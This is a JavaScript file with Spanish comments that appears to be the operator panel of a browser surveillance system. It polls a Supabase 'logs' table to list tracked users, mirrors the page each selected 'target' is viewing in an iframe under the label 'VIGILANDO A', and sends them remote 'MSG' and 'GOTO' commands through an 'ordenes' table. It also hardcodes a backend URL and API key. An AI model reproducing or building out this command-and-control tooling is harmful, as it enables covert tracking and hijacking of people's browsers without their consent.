const SB_URL = "https://gmvczheriaqouwynfdyv.supabase.co";
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdtdmN6aGVyaWFxb3V3eW5mZHl2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA0MTM1OTQsImV4cCI6MjA4NTk4OTU5NH0.22wbgR33dCQ1vfB_EdWpxGY5w811_jsf1dqbU1P6dQs";

let selectedUser = null;
let knownUsers = new Set();

async function updateData() {
    // 1. Obtener todos los logs recientes para identificar usuarios
    const res = await fetch(`${SB_URL}/rest/v1/logs?select=*&order=timestamp.desc&limit=50`, {
        headers: { 'apikey': SB_KEY, 'Authorization': `Bearer ${SB_KEY}` }
    });
    const logs = await res.json();
    
    const listDiv = document.getElementById('user-list');
    const uniqueInLogs = [...new Set(logs.map(l => l.usuario_id))];

    // Actualizar lista de la izquierda
    listDiv.innerHTML = uniqueInLogs.map(uid => `
        <div class="user-item ${selectedUser === uid ? 'active' : ''}" onclick="selectUser('${uid}')">
            <span class="online-dot"></span> ${uid}
        </div>
    `).join('');

    document.getElementById('count').innerText = `${uniqueInLogs.length} detectados`;

    // 2. Si hay un usuario seleccionado, actualizar su pantalla (EL MIRROR)
    if (selectedUser) {
        const userLastLog = logs.find(l => l.usuario_id === selectedUser);
        if (userLastLog) {
            const monitor = document.getElementById('mirror-screen');
            // SOLO actualiza si el usuario cambió de link para evitar recargas infinitas
            if (monitor.src !== userLastLog.url_actual) {
                monitor.src = userLastLog.url_actual;
                document.getElementById('last-url').innerText = userLastLog.url_actual;
            }
        }
    }
}

function selectUser(uid) {
    selectedUser = uid;
    document.getElementById('current-target-name').innerText = "VIGILANDO A: " + uid;
    updateData();
}

async function sendCommand(type) {
    if (!selectedUser) return alert("Selecciona un usuario primero");
    
    let content = "";
    if (type === 'MSG') content = document.getElementById('msg-input').value;
    if (type === 'GOTO') content = document.getElementById('goto-input').value;

    // Eliminar órdenes previas del usuario
    await fetch(`${SB_URL}/rest/v1/ordenes?usuario_id=eq.${selectedUser}`, {
        method: 'DELETE', headers: { 'apikey': SB_KEY, 'Authorization': `Bearer ${SB_KEY}` }
    });

    // Insertar nueva orden
    await fetch(`${SB_URL}/rest/v1/ordenes`, {
        method: 'POST',
        headers: { 'apikey': SB_KEY, 'Authorization': `Bearer ${SB_KEY}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ usuario_id: selectedUser, orden: type, contenido: content, activa: true })
    });
    
    alert(`Comando ${type} enviado con éxito`);
}

setInterval(updateData, 2500);
